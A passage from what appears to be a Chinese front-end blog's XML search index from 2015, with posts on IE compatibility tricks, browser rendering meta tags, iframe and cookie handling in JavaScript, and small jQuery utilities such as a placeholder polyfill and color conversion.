    <url>%2F2015%2F12%2F23%2F%E8%B7%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B9%B3%E5%8F%B0%E8%8E%B7%E5%8F%96%E9%BC%A0%E6%A0%87%E4%BD%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637function getPosition(e) &#123; e = e || window.event; var cursor = &#123;x:0, y:0&#125;; if (e.pageX || e.pageY) &#123; cursor.x = e.pageX; cursor.y = e.pageY; &#125; else &#123; cursor.x = e.clientX + (document.documentElement.scrollLeft || document.body.scrollLeft) - document.documentElement.clientLeft; cursor.y = e.clientY + (document.documentElement.scrollTop || document.body.scrollTop) - document.documentElement.clientTop; &#125; return cursor;&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>跨浏览器获取鼠标位置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于HTML5标签不兼容(IE6~8)]]></title>
    <url>%2F2015%2F12%2F23%2F%E5%85%B3%E4%BA%8Ehtml5%E6%A0%87%E7%AD%BE%E4%B8%8D%E5%85%BC%E5%AE%B9ie68%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;HTML5的语义化标签以及属性，可以让开发者非常方便地实现清晰的web页面布局，加上CSS3的效果渲染，快速建立丰富灵活的web页面显得非常简单。比较常用的HTML5的新标签元素有：1234567891011121314151617181920* ```&lt;nav&gt;```定义页面或区段的导航区域；* ```&lt;section&gt;```页面的逻辑区域或内容组合；* ```&lt;article&gt;```定义正文或一篇完整的内容；* ```&lt;aside&gt;```定义补充或相关内容；* ```&lt;footer&gt;```定义页面或区段的尾部；使用他们能让代码语义化更直观,而且更方便SEO优化。但是此HTML5新标签在IE6/IE7/IE8上并不能识别，需要进行JavaScript处理。### 方法一：通过Javascript创建元素document.createElenment(&quot;&quot;.....&quot;)在```&lt;head&gt;```....```&lt;/head&gt;```中添加如下代码：```javascript&lt;!--[if lt IE 9]&gt;&lt;script type=&quot;text/javascript&quot;&gt;var e = &quot;abbr, article, aside, audio, canvas, datalist, details, dialog, eventsource, figure, footer, header, hgroup, mark, menu, meter, nav, output, progress, section, time, video&quot;.split(&apos;, &apos;);var i= e.length;while (i--)&#123;document.createElement(e[i])&#125;&lt;/script&gt;&lt;![endif]--&gt;&nbsp;方法二：使用Google的html5shiv包（推荐）123&lt;!--[if lt IE 9]&gt; &lt;script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"&gt;&lt;/script&gt; &lt;![endif]--&gt;&nbsp;但是不管使用以上哪种方法,都要初始化新标签的CSS.因为HTML5在默认情况下表现为内联元素，对这些元素进行布局我们需要利用CSS手工把它们转为块状元素方便布局12/*html5*/article,aside,dialog,footer,header,section,footer,nav,figure,menu&#123;display:block&#125;&nbsp;&emsp;&emsp;但是如果ie6/7/8 禁用脚本的用户,那么就变成了无样式的”白板”网页,我们该怎么解决呢?我们可以参照facebook的做法，即引导用户进入带有noscript标识的“/?_fb_noscript=1”页面，用 html4 标签替换 html5 标签，这要比为了保持兼容性而写大量 hack 的做法更轻便一些。1234567&lt;!--[if lte IE 8]&gt;&lt;noscript&gt;&lt;style&gt;.html5-wrappers&#123;display:none!important;&#125;&lt;/style&gt;&lt;div class="ie-noscript-warning"&gt;您的浏览器禁用了脚本，请&lt;a href=""&gt;查看这里&lt;/a&gt;来启用脚本!或者&lt;a href="/?noscript=1"&gt;继续访问&lt;/a&gt;.&lt;/div&gt;&lt;/noscript&gt;&lt;![endif]--&gt;&nbsp;]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>H5标签不兼容</tag>
        <tag>html5不兼容</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何让360、遨游、猎豹等双核浏览器默认以webkit内核渲染网页？]]></title>
    <url>%2F2015%2F12%2F22%2F360%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8%E9%80%9A%E8%BF%87meta%E6%A0%87%E7%AD%BE%E6%8E%A7%E5%88%B6%E6%98%BE%E7%A4%BA%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[前言众知目前国内不少浏览器都自称双核，一般是 IE(Trident)+Webkit。因为 webkit 急速的体验和对 HTML5 的支持，有些情况下开发者可能希望用户优先甚至只使用 webkit 内核渲染，比如通过 Meta 标签来指定。然而目前还没有任何一个公认的标准来实现。大多数用户根本分不清浏览器双核之间的区别。所以把决定权交给开发者，以此给用户带来更好的浏览体验，不失为一件好事。在这方面360就做的不错，我们也建议其它浏览器厂商一起支持这个实现。让这个控制标签成为行业标准。在360内核控制meta标签说明文档中就有详细说明背景介绍由于众所周知的情况，国内的主流浏览器都是双核浏览器：基于Webkit内核用于常用网站的高速浏览。基于IE的内核用于兼容网银、旧版网站。以360的几款浏览器为例，我们优先通过Webkit内核渲染主流的网站，只有小量的网站通过IE内核渲染，以保证页面兼容。在过去很长一段时间里，我们主要的控制手段是一个几百k大小网址库，一个通过长期人工运营收集的网址库。尽管我们努力通过用户反馈、代码标签智能判断技术提高浏览器的自动切核准确率。但是在很多情况下，我们仍然无法达到百份百正确。因此，我们新增加了一个控制手段：内核控制Meta标签。只要你在自己的网站里增加一个Meta标签，告诉360浏览器这个网址应该用哪个内核渲染，哪么360浏览器就会在读取到这个标签后，立即切换对应的内核。并将这个行为应用于这个二级域名下所有网址。目前该功能已经在所有的360安全浏览器实现。我们也建议其它浏览器厂商一起支持这个实现。让这个控制标签成为行业标准。代码示例关于X-UA-Compatible的讲解，请看上一篇文章：HTML Meta中添加X-UA-Compatible和IE=Edge,chrome=1的作用在head标签中添加一行代码：1&lt;meta name="renderer" content="webkit|ie-comp|ie-stand"&gt;完美HTML代码：12345678&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"&gt;&lt;meta name="renderer" content="webkit"&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;content的取值为webkit,ie-comp,ie-stand之一，区分大小写，分别代表用webkit内核，IE兼容内核，IE标准内核。若页面需默认用极速核，增加标签：1&lt;meta name="renderer" content="webkit"&gt;若页面需默认用ie兼容内核，增加标签：1&lt;meta name="renderer" content="ie-comp"&gt;若页面需默认用ie标准内核，增加标签：1&lt;meta name="renderer" content="ie-stand"&gt;在实际使用中有人会发现已经添加1&lt;meta name="renderer" content="webkit"&gt;为什么浏览器有时还是以IE内核渲染？这应该是浏览器的缓存问题，如果关闭浏览器之前的内核是IE，那么第一次打开还是以IE内核渲染，但刷新一下就变为极速模式了（webkit内核）各渲染内核的技术细节内核文档模式HTML5支持ActiveX控件支持WebkitChrome21IE6/7IE9/IE10/IE11(取决于用户的IE)IE兼容YESENOYESIE标准NOYESYES各内核UA示例备注这个功能其实和IE9的X-UA-Compatible很类似，关于IE几个内核的实现介绍，请看：https://blogs.msdn.microsoft.com/ie/2010/06/16/ies-compatibility-features-for-site-developers/]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>360Meta控制显示模式</tag>
        <tag>meta renderer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML Meta中添加X-UA-Compatible和IE=Edge,chrome=1的作用]]></title>
    <url>%2F2015%2F12%2F22%2Fhtml-meta%E4%B8%AD%E6%B7%BB%E5%8A%A0x-ua-compatible%E5%92%8Cieedgechrome1%E7%9A%84%E4%BD%9C%E7%94%A8%2F</url>
    <content type="text"><![CDATA[X-UA-Compatible是自从IE8新加的一个设置，对于IE8以下的浏览器是不识别的。通过在meta中设置X-UA-Compatible的值，可以指定网页的兼容性模式设置。在网页中指定的模式优先权高于服务器中(通过HTTP Header)所指定的模式。兼容性模式设置优先级：tag > http header```1234567891011**常用的例子：**```html&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=7&quot;&gt; #以上代码告诉IE浏览器，无论是否用DTD声明文档标准，IE8/9都会以IE7引擎来渲染页面。 &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=8&quot;&gt; #以上代码告诉IE浏览器，IE8/9都会以IE8引擎来渲染页面。 &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; #以上代码告诉IE浏览器，IE8/9及以后的版本都会以最高版本IE来渲染页面。 &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=7,IE=9&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=7,9&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge,chrome=1&quot;&gt;#以上代码IE=edge告诉IE使用最新的引擎渲染网页，chrome=1则可以激活Chrome Frame.“IE=Edge,chrome=1″这样简单快捷，但是弊端是代码将无法通过W3C验证。其实这并不是问题，毕竟标准只是标准，如果只有这一个“错误”完全不会有任何不良的影响。&nbsp;IE文档兼容性模式所有可能的值：Emulate IE8 mode#指示IE使用指令来决定如何编译内容。Standardsmode指令会显示成IE8 Standards mode而quirksmode会显示成IE5 mode。不同于IE8 mode，Emulate IE8 mode重视指令。Emulate IE7 mode#指示IE使用指令来决定如何编译内容。Standardsmode指令会显示成IE7 Standards mode而quirksmode会显示成IE5 mode。不同于IE7 mode，Emulate IE7mode重视指令。对于许多网页来说这是最推荐的兼容性模式。IE5 mode#编译内容如同IE7的quirksmode之显示状况，和IE5中显示的非常类似。IE7 mode#编译内容如同IE7的standardsmode之显示状况，无论网页是否含有指令。IE8 mode#提供对业界标准的最高支持，包含 W3C Cascading Style Sheets Level 2.1 Specification和W3C SelectorsAPI，并有限的支持 W3C Cascading Style Sheets Level 3 Specification (Working Draft)。Edge mode#指示IE以目前可用的最高模式显示内容。当使用IE8时其等同于IE8 mode。若(假定)未来放出支持更高兼容性模式的IE，使用Edge mode的页面会使用该版本能支持的最高模式来显示内容。同样的那些页面在使用IE8浏览时仍会照常显示。&nbsp;注意事项：1，根据官网定义X-UA-compatible 标头不区分大小写；不过，它必须显示在网页中除 title 元素和其他 meta 元素以外的所有其他元素之前。如果不是的话，它不起作用2，content的内容是IE=8，或者IE=edge等值，注意不是IE8或者直接写个edge的值，否则不起作用如果对WEb服务器了解，可以直接配置一下VirtualHost:Apache:12345678&lt;IfModule mod_setenvif.c&gt;&lt;IfModule mod_headers.c&gt;BrowserMatch MSIE ieHeader set X-UA-Compatible "IE=Edge" env=ieBrowserMatch chromeframe gcfHeader append X-UA-Compatible "chrome=1" env=gcf&lt;/IfModule&gt;&lt;/IfModule&gt;Nginx:1add_header "X-UA-Compatible" "IE=Edge,chrome=1";&nbsp;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>chrome=1</tag>
        <tag>chrome=1作用</tag>
        <tag>IE=Edge</tag>
        <tag>Meta中添加X-UA-Compatible和IE=Edge</tag>
        <tag>X-UA-Compatible</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js操作iframe框架的一些基本概念]]></title>
    <url>%2F2015%2F12%2F22%2Fjs%E6%93%8D%E4%BD%9Ciframe%E6%A1%86%E6%9E%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%2F</url>
    <content type="text"><![CDATA[1、获取iframe的window对象存在跨域访问限制。iframeElement.contentWindow 兼容&nbsp;2、获取iframe的document对象存在跨域访问限制。chrome: iframeElement.contentDocumentfirefox: iframeElement.contentDocumentie:iframeElement.contentWindow.document(ie没有iframeElement.contentDocument属性)var getIframeDocument = iframeElement.contentDocument||iframeElement.contentWindow.document;&nbsp;3、iframe中获得父页面的window对象存在跨域访问限制。父页面：window.parent 兼容顶层页面：window.top 兼容&nbsp;4、获取iframe在父页面中的html标签存在跨域访问限制。window.frameElement 兼容&nbsp;5、iframe的onload事件非ie浏览器都提供了onload事件。例如下面代码在ie中是不会有弹出框的。123456var ifr = document.createElement('iframe');ifr.src = 'http://www.b.com/index.php';ifr.onload = function() &#123;alert('loaded');&#125;;document.body.appendChild(ifr);但是ie却又似乎提供了onload事件，下面两种方法都会触发onload方法一：1&lt;iframe onload="alert('loaded');" src="http://www.b.com/index.php"&gt;&lt;/iframe&gt;方法二：123//只有ie才支持为createElement传递这样的参数var ifr = document.createElement('&lt;iframe onload="alert('loaded');" src="http://www.b.com/index.php"&gt;&lt;/iframe&gt;');document.body.appendChild(ifr);由于iframe元素包含于父级页面中，因此以上方法均不存在跨域问题。实际上IE提供了onload事件，但必须使用attachEvent进行绑定。12345678var ifr = document.createElement('iframe');ifr.src = 'http://b.a.com/b.php';if (ifr.attachEvent) &#123;ifr.attachEvent('onload', function()&#123; alert('loaded'); &#125;);&#125; else &#123;ifr.onload = function() &#123; alert('loaded'); &#125;;&#125;document.body.appendChild(ifr);&nbsp;6、frameswindow.frames可以获取到页面中的节点(iframe、frame等)，需要注意的是取到的是window对象，而不是HTMLElement。1234var ifr1 = document.getElementById('ifr1');var ifr1win = window.frames[0];ifr1win.frameElement === ifr1; // trueifr1win === ifr1; // false补充：var iframeObj = document.getElementById(‘iframeid’);a：获取子页面中body里的内容var iframeContent = iframeObj.contentWindow.document.body.innerHTML;b：获取子页面中head里的内容var iframeContent = iframeObj.contentWindow.document.head.innerHTML;c：获取子页面中html里的内容var iframeContent = iframeObj.cententWindow.document.documentElement.innerHTML;d：获取子页面中某个元素里的内容var iframeContent = iframeObj.contentWindow.document.getElementById(‘element_id’).innerHTML;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js操作iframe</tag>
        <tag>js操作iframe框架的概念</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[placeholder的兼容处理(基于jq)]]></title>
    <url>%2F2015%2F12%2F21%2Fplaceholder%E7%9A%84%E5%85%BC%E5%AE%B9%E5%A4%84%E7%90%86%E5%9F%BA%E4%BA%8Ejq%2F</url>
    <content type="text"><![CDATA[这是一个老问题，结合项目的经验，需要处理的问题有一下几个。1.只有输入框（input/textarea）下的palaceholder属性存在的时候才需要处理这类兼容2.处理好输入框上焦点和是焦点的文本显示3.密码输入框比较特殊，因为为其设置显示文本时显示的是一串“*”。这个问题后面分析。处理好前两点还是比较简单的，处理源码为如下1234567891011121314151617181920212223242526272829303132333435363738394041var browserSupport = &#123; placeholder: 'placeholder' in document.createElement('input')&#125;$(function() &#123; //模拟placeholder if( !browserSupport.placeholder)&#123; $('input[placeholder],textarea[placeholder]').each(function()&#123; var that = $(this), text= that.attr('placeholder'), oldType; if(that.val()==="")&#123; that.val(text).addClass('placeholder'); &#125; that.focus(function()&#123; //ie8下readonly依然可以上焦点的处理 if(that.attr('readonly'))&#123; that.blur(); return; &#125; that.removeClass('placeholder'); if(that.val()===text)&#123; that.val(""); &#125; &#125;).blur(function()&#123; if(that.val()==="")&#123; that.val(text).addClass('placeholder'); //防止异常情况：当有placeholder类，且值不为空（代码设置值时容易出现） &#125;else&#123; that.removeClass('placeholder'); &#125; &#125;).closest('form').submit(function()&#123; if(that.val() === text)&#123; that.val(''); &#125; &#125;); &#125;); &#125;&#125;);可以看出处理还是比较简单的。在不支持placeholder的浏览器下没有上焦点的为placeholder的空白输入框添加class placeholder并设置其内容为placeholder值。上焦点的placeholder的输入框判断其值是否是手动设置的placeholder值，如果是则重置输入框为空白。当然免不了提交表单的时候要清除兼容placeholder的影响。这里面有一个细节事件是绑定在标签对应的缓存中，而不是委托document等祖先节点，为什么？有两个考虑：1.避免有设置事件禁止冒泡导致绑定到document上的事件没法处理。2.事件执行的先后顺序是先执行绑定到自身节点的事件，然后在冒泡到document节点执行事件源委托到document的事件。至于第3点密码输入框的问题。我们首先考虑是当密码输入框失焦的时候先更改输入框的type为text类型然后按照正常的设置其值为placeholder值；聚焦的时候将type值设置回来并恢复其值。但是这个存在问题是IE8不允许更改type类型。没招了，只能额外的添加一个元素来展示密码输入框的placeholder值。结果完整的源码就变成了如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/*.placeholder&#123; color: #aaa!important;&#125;span.placeholder&#123; position: absolute; left: 0; line-height: 34px; padding-left: 12px;&#125;*/var browserSupport = &#123; placeholder: 'placeholder' in document.createElement('input')&#125;/* ajax请求发现未登录时，服务端返回401错误，然后此处统一处理401错误，跳转到登录页面 */$(document).ready(function() &#123; //模拟placeholder if( !browserSupport.placeholder)&#123; $('input[placeholder],textarea[placeholder]').each(function()&#123; var that = $(this), text= that.attr('placeholder'), oldType; if(that.val()==="")&#123; if(that.attr('type') != 'password')&#123; that.val(text).addClass('placeholder'); &#125;else&#123; that.before('&lt;span class="placeholder"&gt;请输入密码&lt;/span&gt;'); &#125; &#125; that.focus(function()&#123; //ie8下readonly依然可以上焦点的处理 if(that.attr('readonly'))&#123; that.blur(); return; &#125; //清除span.placeholder that.prev("span.placeholder").remove(); that.removeClass('placeholder'); if(that.val()===text)&#123; that.val(""); &#125; &#125;).blur(function()&#123; if(that.val()==="")&#123; if(that.attr('type') != 'password')&#123; that.val(text).addClass('placeholder'); &#125;else&#123; that.before('&lt;span class="placeholder"&gt;请输入密码&lt;/span&gt;'); &#125; //防止异常情况：当有placeholder类，且值不为空（代码设置值时容易出现） &#125;else&#123; that.removeClass('placeholder'); &#125; &#125;).closest('form').submit(function()&#123; if(that.val() === text)&#123; that.val(''); &#125; &#125;); &#125;); $(document).on('click','span.placeholder',function()&#123; $(this).next("[placeholder]").focus(); //删除span.placeholder会在[placeholder]的focus中进行 &#125;) &#125;&#125;)我自己专门添加了一个span.placeholder来显示密码输入框的占位符显示。然后添加了一个监听器监听span.placeholder被点击。功能是完成了，在测试的时候还是会遇到一个问题，浏览器有自动填写表单的时候初始化可能会出现异常，现在为止还没有什么好的方法捕获自动填写表单事件，结果可能导致密码输入框的placeholder显示和内容一起显示。所以如果要使用这种密码输入框的placeholder兼容方式，最好让浏览器不自动填充，也有利于信息保密：给密码input设置autocomplete=off即可。需要注意的是autocomplete=off在chrome下也有兼容问题，不过这里是专门给IE下用的到没有什么问题，只不过chrome下是没有保密而已。更多的信息自行百度。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>placeholder</tag>
        <tag>placeholder兼容处理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery如何将获取的颜色值转换为十六进制形式]]></title>
    <url>%2F2015%2F12%2F18%2Fjquery%E5%A6%82%E4%BD%95%E5%B0%86%E8%8E%B7%E5%8F%96%E7%9A%84%E9%A2%9C%E8%89%B2%E5%80%BC%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%BD%A2%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[大家或许已经注意到了，在谷歌、火狐和IE8以上浏览器中，获取的颜色值是RGB形式，例如rgb(255,255,0)，感觉非常不适应，或者在实际编码中不方便使用，这个时候就需要进行转换，下面就提供一段相关转换代码。代码如下:HTML：123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=" utf-8"&gt;&lt;meta name="author" content="http://www.npm8.com/" /&gt;&lt;title&gt;grycheng前端博客&lt;/title&gt;&lt;style type="text/css"&gt;#thediv&#123;width:200px;height:100px;background-color:#CCC;line-height:100px;text-align:center;color:#60F;&#125;&lt;/style&gt;&lt;script type="text/javascript" src="http://www.softwhy.com/mytest/jQuery/jquery-1.8.3.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="thediv"&gt;grycheng前端博客&lt;/div&gt;&lt;input type="button" value="点击查看效果" id="bt" /&gt;&lt;/body&gt;&lt;/html&gt;JavaScript：12345678910111213141516171819$.fn.getHexBackgroundColor=function(id,property) &#123; var rgb=$(id).css(property); if($.browser.msie&amp;amp;&amp;amp;$.browser.version&gt;8||$.browser.mozilla||$.browser.webkit) &#123; rgb=rgb.match(/^rgb\((\d+),\s*(\d+),\s*(\d+)\)$/); function hex(x) &#123; return ("0"+parseInt(x).toString(16)).slice(-2); &#125; rgb="#"+hex(rgb[1])+hex(rgb[2])+hex(rgb[3]); &#125; return rgb; &#125; $(document).ready(function()&#123; $("#bt").click(function()&#123; $("#thediv").text($.fn.getHexBackgroundColor("#thediv","color")) &#125;) &#125;)注意:运行编辑器之后，再按F5刷新网页即可查看演示。以上代码实现了我们的要求，可以将RGB格式的颜色值转换为十六进制形式，下面就简单介绍一下实现过程:一.实现原理:当点击按钮的会触发click事件，进而执行click事件处理函数，此处理函数能够将转换后的颜色值写入div中去，其中的核心函数就是getHexBackgroundColor()，此函数首先会判断浏览器是否是IE9之下，如果是则直接返回颜色值，不进行转换，因为在IE9以下浏览器获取的颜色值就是16进制的，如果是IE8以上浏览器或者谷歌火狐，则需要进行转换，关于转换细节这里就不多介绍了，可以参考你代码注释。二.代码注释:1.$.fn.getHexBackgroundColor=function(id,property){}，声明一个函数，此函数可以可以进行颜色值转换，此函数具有两个参数，第一个参数是元素的id属性值，第二个是属性。2.var rgb=$(id).css(property)，获取颜色值，这个时候rgb也许是16进制也许是RGB格式的。3.if($.browser.msie&amp;&amp;$.browser.version&gt;8||$.browser.mozilla||$.browser.webkit)，判断浏览器是否是IE8以上或者是火狐或者谷歌浏览器。4.rgb=rgb.match(/^rgb((\d+),\s(\d+),\s(\d+))$/)，这个要对正则表达式有所了解，通过match()函数可以将颜色值字符串生成一个数组，这个数组中有4个元素，以rgb(102, 0, 255)作为例子，第一个元素是整个颜色值字符串rgb(102, 0, 255)，第二个数组元素是102，第三个是0，第四个是255。5.function hex(x){}，声明一个函数，此函数可以用就是进行颜色值转换，具有一个参数，传递的是rgb数组的某一项。6.return (“0”+parseInt(x).toString(16)).slice(-2)，可以将传入数值转换为16进制，注意前面是添加了一个0，最好使用slice函数截取最后两个字符，并返回截取的这两个字符。7.rgb=”#”+hex(rgb[1])+hex(rgb[2])+hex(rgb[3])，将值组合起来。8.return rgb，返回rgb这个值。9.$(document).ready(function(){})，当文档结构完全加载完毕再去执行函数中的代码。10.$(“#bt”).click(function(){}），为按钮注册click事件处理桉树。11.$(“#thediv”).text($.fn.getHexBackgroundColor(“#thediv”,”color”)) ，将转换后的颜色值写入div。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>jq颜色值转换为十六进制</tag>
        <tag>js 颜色值转换为十六进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript设置连续两次点击按钮的时间间隔]]></title>
    <url>%2F2015%2F12%2F18%2Fjavascript%E8%AE%BE%E7%BD%AE%E8%BF%9E%E7%BB%AD%E4%B8%A4%E6%AC%A1%E7%82%B9%E5%87%BB%E6%8C%89%E9%92%AE%E7%9A%84%E6%97%B6%E9%97%B4%E9%97%B4%E9%9A%94%2F</url>
    <content type="text"><![CDATA[在实际应用中，可能并不希望按钮联系被不间断的点击，所以要限定一定的时间间隔才能够再次点击按钮，下面就通过代码实例介绍一下如何实现此功能，代码如下:HTML：123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta name="author" content="http://www.npm8.com/" /&gt;&lt;title&gt;grycheng前端博客&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="thediv"&gt;0&lt;/div&gt;&lt;input type="button" id="bt" value="查看效果"/&gt;&lt;/body&gt;&lt;/html&gt;JavaScript：12345678910111213141516171819202122232425window.onload=function()&#123; var odiv=document.getElementById("thediv"); var obt=document.getElementById("bt"); var count=0; var flag=null; function done()&#123; if(count==0)&#123; clearInterval(flag); &#125; else&#123; count=count-1; &#125; &#125; obt.onclick=function()&#123; var val=parseInt(odiv.innerHTML); if(count==0)&#123; odiv.innerHTML=val+1; count=20; flag=setInterval(done,1000); &#125; else&#123; alert("还需要"+(count)+"秒才能点击"); &#125; &#125; &#125;以上代码实现了我们的要求，可以限制点击按钮的间隔时间，这一效果可以扩展到其他的功能中，比如限制发帖的间隔时间等等，下面就介绍一下它的实现过程。一.代码注释:1.window.onload=function(){}，规定文档内容完全加载完毕再去执行函数中的代码。2.var odiv=document.getElementById(“thediv”)，获取div元素对象。3.var obt=document.getElementById(“bt”)，获取按钮对象。4.var count=0，声明一个变量并赋初值为0，它用来存储间隔时间。5.var flag=null，声明一个变量并赋初值为null，此变量用来存储定时器函数的返回值。6.function done(){}，此函数可以被定时器函数不断的调用，来对count进行递减。7.if(count==0){clearInterval(flag);}，如果count==0，则停止定时器函数的执行。8.else{count=count-1;}，如果不等于0，则进行减一操作。9.obt.onclick=function(){}，为按钮注册点击事件处理函数。10.var val=parseInt(odiv.innerHTML)，获取div中的内容，并转换为整数。11.12345if(count==0)&#123;odiv.innerHTML=val+1;count=20;flag=setInterval(done,1000);&#125;如果count等于0话饿，那么就将div中的内容+1，并且将count设置为20，同时开机定时器函数的执行。12.else{alert(“还需要”+(count)+”秒才能点击”);},如果count不等于零，那么弹出还差多长时间可以点击。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js设置连续两次点击按钮的时间间隔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何检测页面是否有重复的id属性值]]></title>
    <url>%2F2015%2F12%2F18%2F%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B%E9%A1%B5%E9%9D%A2%E6%98%AF%E5%90%A6%E6%9C%89%E9%87%8D%E5%A4%8D%E7%9A%84id%E5%B1%9E%E6%80%A7%E5%80%BC%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;根据W3C标准规定，在同一个文档内id属性值是唯一的，也就是说不能够有重复的id属性值，如果当页面比较庞大的话，如何去检测是否有重复的id属性值那将是一个复杂的工作，下面将提供一段代码实例可以解决此问题。12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=" utf-8"&gt;&lt;meta name="author" content="http://www.npm8.com/" /&gt;&lt;title&gt;grycheng前端博客&lt;/title&gt;&lt;script type="text/javascript"&gt;window.onload=function()&#123;var tags=document.getElementsByTagName("*"),count=tags.length, time, ret = &#123;&#125;, id;time=new Date();for(var i = 0; i &lt; count; i++)&#123;id=tags[i].id;if(id)&#123;if(ret[id])&#123;alert(id + "/n用时：" + (new Date() - time));return;&#125;else&#123;ret[id]=true;&#125;&#125;&#125;alert("未找到相同ID");&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;以上代码可以检测文档中是否含有重复的id。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js检测页面是否有重复的id属性值</tag>
        <tag>js检测页面重复id</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery实现的cookie操作插件]]></title>
    <url>%2F2015%2F12%2F18%2Fjquery%E5%AE%9E%E7%8E%B0%E7%9A%84cookie%E6%93%8D%E4%BD%9C%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[cookie虽说具有一定的确定，但是在某些问题的处理上还是非常好用的，这里就不列举了，这里提供一个jquery实现的操作cookie的插件，功能比较全面，希望给大家带来一定的帮助，代码如下:123456789101112131415161718192021222324252627282930313233343536373839jQuery.cookie=function(name, value, options)&#123; if(typeof value != 'undefined')&#123; options=options||&#123;&#125;; if(value === null)&#123; value=''; options.expires=-1; &#125; var expires=''; if(options.expires&amp;amp;&amp;amp;(typeof options.expires=='number'||options.expires.toUTCString))&#123; var date; if(typeof options.expires=='number')&#123; date=new Date(); date.setTime(date.getTime()+(options.expires * 24 * 60 * 60 * 1000)); &#125; else&#123; date = options.expires; &#125; expires= '; expires=' + date.toUTCString(); &#125; var path = options.path ? '; path=' + (options.path) : ''; var domain = options.domain ? '; domain=' + (options.domain) : ''; var secure = options.secure ? '; secure' : ''; document.cookie = [name, '=', encodeURIComponent(value), expires, path, domain, secure].join(''); &#125; else&#123; var cookieValue = null; if(document.cookie &amp;amp;&amp;amp; document.cookie != '')&#123; var cookies = document.cookie.split(';'); for (var i = 0; i &lt; cookies.length; i++)&#123; var cookie = jQuery.trim(cookies[i]); if (cookie.substring(0, name.length + 1) == (name + '='))&#123; cookieValue = decodeURIComponent(cookie.substring(name.length + 1)); break; &#125; &#125; &#125; return cookieValue; &#125;&#125;以上是一个操作cookie的功能强大的jquery插件。插件使用说明如下:1.jQuery.cookie(“mycookie”),获取cookie。2.jQuery.cookie(“mycookie”,”cookievalue”),设置cookie的值。3.jQuery.cookie(“mycookie”,”cookievalue”，{expires: 3, path: ‘/‘, domain: ‘jquery.com’, secure: true})，创建一个cookie，并设置cookie的过期时间，路径，域名等。4.jQuery.cookie(“mycookie”,null),删除一个cookie。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>Cookie插件</tag>
        <tag>cookie</tag>
        <tag>jquery实现的cookie操作插件</tag>
        <tag>jq实现cookie</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[eval()函数用法详解]]></title>
    <url>%2F2015%2F12%2F18%2Feval%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3%2F</url>
